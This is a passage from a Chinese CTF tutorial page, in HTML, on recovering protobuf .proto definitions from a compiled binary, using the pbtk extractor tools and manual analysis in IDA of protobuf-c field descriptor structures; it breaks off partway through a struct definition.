+</span></span><span class="line"><span class="cl">git clone https://github.com/marin-m/pbtk
+</span></span><span class="line"><span class="cl">cd pbtk</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>使用：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 从二进制文件中提取 .proto 定义
+</span></span><span class="line"><span class="cl">./extractors/from_binary.py /path/to/binary
+</span></span><span class="line"><span class="cl"># 从 JAR/APK 提取
+</span></span><span class="line"><span class="cl">./extractors/jar_extract.py /path/to/app.apk
+</span></span><span class="line"><span class="cl"># 从网页提取 JsProtoUrl
+</span></span><span class="line"><span class="cl">./extractors/web_extract.py https://example.com/proto-endpoint</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>也可以创建软链接使用，注意这里要用绝对路径</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo ln -s /home/ctf/pbtk/extractors/from_binary.py /usr/local/bin/from_binary</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>然后就可以直接这样使用：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from_binary ./pwn</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p><strong>注意</strong></p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ strings ./pwn | grep -i &#34;\.proto&#34;</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>如果没有就用不了</p>
+<h3 class="heading-element" id="手动逆向"><span>手动逆向</span>
+  <a href="#%e6%89%8b%e5%8a%a8%e9%80%86%e5%90%91" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 class="heading-element" id="message"><span>message</span>
+  <a href="#message" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-protobuf"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-protobuf" data-lang="protobuf"><span class="line"><span class="cl"><span class="n">syntax</span> <span class="o">=</span> <span class="s">&#34;proto2&#34;</span><span class="p">;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"> <span class="kd">message</span> <span class="nc">Message_request</span><span class="p">{</span><span class="err">
+</span></span></span><span class="line"><span class="cl"> <span class="k">required</span> <span class="kt">int32</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"> <span class="k">required</span> <span class="kt">string</span> <span class="n">sender</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"> <span class="k">required</span> <span class="kt">uint32</span> <span class="n">len</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"> <span class="k">required</span> <span class="kt">bytes</span> <span class="n">content</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"> <span class="k">required</span> <span class="kt">int32</span> <span class="n">actionid</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"> <span class="p">}</span><span class="err">
+</span></span></span><span class="line"><span class="cl"> <span class="kd">message</span> <span class="nc">Message_response</span><span class="p">{</span><span class="err">
+</span></span></span><span class="line"><span class="cl"> <span class="k">required</span> <span class="kt">int32</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"> <span class="k">required</span> <span class="kt">string</span> <span class="n">receiver</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"> <span class="k">required</span> <span class="kt">int32</span> <span class="n">status_code</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"> <span class="k">optional</span> <span class="kt">string</span> <span class="n">error_message</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"> <span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><p>如果定义了两个<code>message</code>，我们去IDA中查看字符串，搜索<code>message</code>就会发现：</p>
+<a class="lightgallery" target="_blank" href="/img/protobuf/message.png" title="/img/protobuf/message.png" data-thumbnail="/img/protobuf/message.png" data-sub-html="<h2>/img/protobuf/message.png</h2>"><img loading="lazy" src='/img/protobuf/message.png' alt="/img/protobuf/message.png"></a>
+<p>这里会出现<code>message</code>的名字，并知道定义了几个<code>message</code></p>
+<h4 class="heading-element" id="成员"><span>成员</span>
+  <a href="#%e6%88%90%e5%91%98" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>一般从<code>rodata</code>从上往下看，看到的第一个一般都是<code>string</code>中的第一个，这里的第一个就是<code>message_request</code>。在IDA里：</p>
+<a class="lightgallery" target="_blank" href="/img/protobuf/member1.png" title="/img/protobuf/member1.png" data-thumbnail="/img/protobuf/member1.png" data-sub-html="<h2>/img/protobuf/member1.png</h2>"><img loading="lazy" src='/img/protobuf/member1.png' alt="/img/protobuf/member1.png"></a>
+<p>往下找还能找到另一个<code>message</code>的成员：</p>
+<a class="lightgallery" target="_blank" href="/img/protobuf/member2.png" title="/img/protobuf/member2.png" data-thumbnail="/img/protobuf/member2.png" data-sub-html="<h2>/img/protobuf/member2.png</h2>"><img loading="lazy" src='/img/protobuf/member2.png' alt="/img/protobuf/member2.png"></a>
+<p>因为上面有id了，这里的id就不会显示</p>
+<p><strong>更准确的查看成员的话</strong>，可以点击旁边的<code>; DATA XREF: .data.rel.ro:0000000000003CD0↓o</code>，就能查看引用</p>
+<p>这会跳到<code>.data.rel.ro</code>段，跳到的这里，一片地址都是同一个<code>message的成员</code></p>
+<h4 class="heading-element" id="字段描述符"><span>字段描述符</span>
+  <a href="#%e5%ad%97%e6%ae%b5%e6%8f%8f%e8%bf%b0%e7%ac%a6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>了解完有哪些<code>message</code>，每个<code>message</code>有哪些成员，接下来就是每个成员的类型</p>
+<p>这就要到<code>.data.rel.ro</code>去看了</p>
+<p>proto文件：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">syntax = &#34;proto2&#34;;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">message User {
+</span></span><span class="line"><span class="cl">  required int32 id = 1;
+</span></span><span class="line"><span class="cl">  required string name = 2;
+</span></span><span class="line"><span class="cl">  optional string email = 3;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">message User2 {
+</span></span><span class="line"><span class="cl">  required int32 id_2 = 1;
+</span></span><span class="line"><span class="cl">  required string name = 2;
+</span></span><span class="line"><span class="cl">  optional string email_2 = 3;
+</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><p>用IDA打开</p>
+<p>这里取<code>User</code>的<code>name</code>成员来分析</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">.data.rel.ro:0000000000003A68                 dq offset aName         ; &#34;name&#34;
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A70                 db    2
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A71                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A72                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A73                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A74                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A75                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A76                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A77                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A78                 db  0Eh
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A79                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A7A                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A7B                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A7C                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A7D                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A7E                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A7F                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A80                 db  20h
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A81                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A82                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A83                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A84                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A85                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A86                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A87                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A88                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A89                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A8A                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A8B                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A8C                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A8D                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A8E                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A8F                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A90                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A91                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A92                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A93                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A94                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A95                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A96                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A97                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A98                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A99                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A9A                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A9B                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A9C                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A9D                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A9E                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A9F                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003AA0                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003AA1                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003AA2                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003AA3                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003AA4                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003AA5                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003AA6                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003AA7                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003AA8                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003AA9                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003AAA                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003AAB                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003AAC                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003AAD                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003AAE                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003AAF                 db    0</span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><p>这里其实就是对应这个结构体（<code>proto3</code>去掉了<code>default_value</code>字段）：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">ProtobufCFieldDescriptor</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">;</span>            <span class="c1">// 0x00 - 指向字段名的字符串
+</span></span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>             <span class="c1">// 0x08 - 字段编号
+</span></span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">label</span><span class="p">;</span>          <span class="c1">// 0x0C - required/optional/repeated
+</span></span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">type</span><span class="p">;</span>           <span class="c1">// 0x10 - protobuf 类型 (int32=1, string=14 等)
+</span></span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">quantifier_offset</span><span class="p">;</span> <span class="c1">// 0x14 - has_xxx 或 array length 偏移
+</span></span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">offset</span><span class="p">;</span>         <span class="c1">// 0x18 - 在 message struct 里的偏移
+</span></span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">_pad0</span><span class="p">;</span>          <span class="c1">// 0x1C - 对齐
+</span></span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">descriptor</span><span class="p">;</span>      <span class="c1">// 0x20 - 嵌套 message/enum 描述符
+</span></span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">default_value</span><span class="p">;</span>   <span class="c1">// 0x28 - 默认值
+</span></span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">;</span>          <span class="c1">// 0x30
